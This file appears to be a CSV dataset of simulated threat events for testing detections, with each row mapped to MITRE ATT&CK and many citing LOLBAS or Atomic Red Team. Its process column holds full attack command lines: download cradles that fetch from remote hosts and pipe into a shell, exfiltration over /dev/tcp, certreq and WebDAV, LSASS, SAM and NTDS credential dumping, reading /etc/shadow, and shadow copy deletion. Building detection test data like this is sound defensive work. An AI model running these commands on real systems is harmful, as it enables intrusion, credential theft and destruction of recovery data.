id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-01,Threat Event,TRUE,WKS01,Shadow copy deletion with vssadmin.exe,C:\Windows\system32\cmd.exe,C:\Windows\system32\vssadmin.exe,vssadmin.exe,vssadmin.exe delete shadows /for=C,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-02,Threat Event,TRUE,WKS02,Whoami being used for local groups recon,C:\Windows\system32\cmd.exe,C:\Windows\system32\whoami.exe,whoami.exe,whoami /groups,"Discovery
Execution","System Owner/User Discovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-03,Threat Event,TRUE,WKS03,Process enumeration/discovery with tasklist,C:\Windows\system32\cmd.exe,C:\Windows\system32\tasklist.exe,tasklist.exe,tasklist,"Discovery
Execution","Process Discovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-04,Threat Event,TRUE,SRV04,Apache2 webserver process spawning whoami (recon commands via webshell),/usr/sbin/apache2,/usr/bin/whoami,whoami,/usr/bin/whoami,"Persistence
Initial Access
Execution","Server Software Component: Web Shell
Exploit Public-Facing Application
Exploitation for Client Execution",,
PROC-TE-05,Threat Event,TRUE,UBUNTU05,Wget being used to download a shell script from a remote IP,/bin/bash,/usr/bin/wget,wget,wget http://193.176.183.245/a.sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-06,Threat Event,TRUE,UBUNTU06,Reading /etc/passwd with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/passwd,"Credential Access
Execution","OS Credential Dumping
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-07,Threat Event,TRUE,UBUNTU07,Reading /etc/shadow with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/shadow,"Credential Access
Execution","OS Credential Dumping
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-08,Threat Event,TRUE,UBUNTU08,Unix/Linux in-memory curl cradle (fileless execution),/usr/bin/dash,/usr/bin/curl,curl,curl http://193.176.183.245/ahdytg | sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-09,Threat Event,TRUE,WKS09,Tool Ingress via Appinstaller.exe (Lolbas Project),C:\Windows\system32\explorer.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe,AppInstaller.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLx,Command and Control,Ingress Tool Transfer,https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/,
PROC-TE-10,Threat Event,TRUE,WKS10,Exfiltration via Windows Bash.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bash.exe,bash.exe,C:\Windows\System32\bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/193.176.183.245',"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Bash/,
PROC-TE-11,Threat Event,TRUE,WKS11,Tool Ingress via Bitsadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,"Command and Control
Execution
Defense Evasion
Persistence","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-12,Threat Event,TRUE,WKS12,Bitsadmin.exe being used to execute payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"Defense Evasion
Execution
Persistence","Hide Artifacts: NTFS File Attributes
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-13,Threat Event,TRUE,WKS13,Bitsadmin.exe being used to copy cmd.exe to alternate location/name (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"Defense Evasion
Execution
Persistence","Masquerading: Rename System Utilities
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-14,Threat Event,TRUE,WKS14,Certoc.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\certoc.exe,certoc.exe,C:\windows\system32\certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certoc/,
PROC-TE-15,Threat Event,TRUE,WKS15,CertReq.exe being used for Exfiltration (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certreq.exe,certreq.exe,C:\Windows\System32\certreq.exe -Post -config https://hy7dy.xyz/ c:\windows\win.ini,"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certreq/,
PROC-TE-16,Threat Event,TRUE,WKS16,Certutil.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,C:\Windows\System32\certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certutil/,
PROC-TE-17,Threat Event,TRUE,WKS17,Cmd.exe executing payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe - < fakefile.doc:payload.bat,Execution,Command and Scripting Interpreter: Windows Command Shell,https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
PROC-TE-18,Threat Event,TRUE,WKS18,Cmd.exe exfiltration via WebDAV server (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe /C ""type C:\Public\creds.txt > \\\\193.176.183.245\pyr\creds.txt""","Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
PROC-TE-19,Threat Event,TRUE,WKS19,Exfiltration via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://ui78d.xyz/fiosiu?encodedfile,"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
PROC-TE-20,Threat Event,TRUE,WKS20,Tool Ingress via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
PROC-TE-21,Threat Event,TRUE,WKS21,Tool Ingress via hh.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\SysWOW64\hh.exe,hh.exe,C:\Windows\SysWOW64\hh.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Hh/,
PROC-TE-22,Threat Event,TRUE,WKS22,Tool Ingress via ieexec.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe,ieexec.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ieexec/,
PROC-TE-23,Threat Event,TRUE,WKS23,Tool Ingress via MpCmdRun.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe,MpCmdRun.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe -DownloadFile -url https://ui78d.xyz/fiosiu -path c:\temp\beacon.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/,
PROC-TE-24,Threat Event,TRUE,WKS24,Arbitrary Code Execution via MSDT.exe (CVE-2022-30190 - Lolbas Project),C:\Program Files\Programs\Office 2019\Office14\excel.exe,C:\Windows\System32\Msdt.exe,Msdt.exe,"C:\Windows\System32\Msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","Defense Evasion
Execution","System Binary Proxy Execution
Exploitation for Client Execution",https://lolbas-project.github.io/lolbas/Binaries/Msdt/,
PROC-TE-25,Threat Event,TRUE,WKS25,Tool Ingress via msedge.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Microsoft\Edge\Application\msedge.exe,msedge.exe,"C:\Program Files\Microsoft\Edge\Application\msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""http://example.com/evil.b64.html"" > out.b64","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Msedge/,
PROC-TE-26,Threat Event,TRUE,WKS26,Mshta VBS Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe vbscript:Close(Execute(""GetObject(""""script:https://ui78d.xyz/ac.sct"""")""))","Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-27,Threat Event,TRUE,WKS27,Mshta JavaScript Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe javascript:a=GetObject(""script:https://ui78d.xyz/al.sct"").Exec();close();","Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-28,Threat Event,TRUE,WKS28,Mshta Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,C:\Windows\System32\mshta.exe https://ui78d.xyz/fiosiu,"Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-29,Threat Event,TRUE,WKS29,Msiexec download cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\msiexec.exe,msiexec.exe,C:\Windows\System32\msiexec.exe /q /i http://ui78d.xyz/tmp/cmd.png,"Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Msiexec
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,
PROC-TE-30,Threat Event,TRUE,WKS30,Ngen.exe Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe,ngen.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe http://ui78d.xyz/tmp/cmd.png,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ngen/,
PROC-TE-31,Threat Event,TRUE,WKS31,LSASS Dumping via rdrleakdiag.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\rdrleakdiag.exe,rdrleakdiag.exe,C:\windows\system32\rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/,
PROC-TE-32,Threat Event,TRUE,WKS32,Credential Dumping via reg save (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,C:\windows\system32\reg.exe save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Reg/,
PROC-TE-33,Threat Event,TRUE,WKS33,Tool Ingress via regsvr32.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\regsvr32.exe,regsvr32.exe,C:\Windows\System32\regsvr32.exe /s /n /u /i:http://ui78d.xyz/tmp/cmd.sct scrobj.dll,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/,
PROC-TE-34,Threat Event,TRUE,WKS34,Tool Ingress via replace.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\replace.exe,replace.exe,C:\Windows\System32\replace.exe \\\\webdav.host.xyz\foo\bar.exe c:\Public\ /A,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Replace/,
PROC-TE-35,Threat Event,TRUE,WKS35,NTLM hash leak via rpcping (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rpcping.exe,rpcping.exe,C:\Windows\System32\rpcping.exe -s 193.176.183.245 -e 1234 -a privacy -u NTLM,"Credential Access
Execution","Forced Authentication
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rpcping/,
PROC-TE-36,Threat Event,TRUE,WKS36,Rundll32 cradle via UNC path (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe \\\\193.176.183.245\share\payload.dll,EntryPoint","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rundll32/,
PROC-TE-37,Threat Event,TRUE,WKS37,NTDS.dit theft via Wbadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,"C:\Windows\System32\wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/,
PROC-TE-38,Threat Event,TRUE,WKS38,Tool Ingress via msedge_proxy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe,msedge_proxy.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://193.176.183.245/a.sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/,
PROC-TE-39,Threat Event,TRUE,WKS39,Dump LSASS.exe Memory using renamed ProcDump (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,C:\Users\joebob\Documents\onedrive.exe -accepteula -ma lsass.exe C:\Windows\Temp\lssd.dmp,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/,
PROC-TE-40,Threat Event,TRUE,WKS40,Dump LSASS.exe Memory using comsvcs.dll (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full","Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Libraries/comsvcs/,
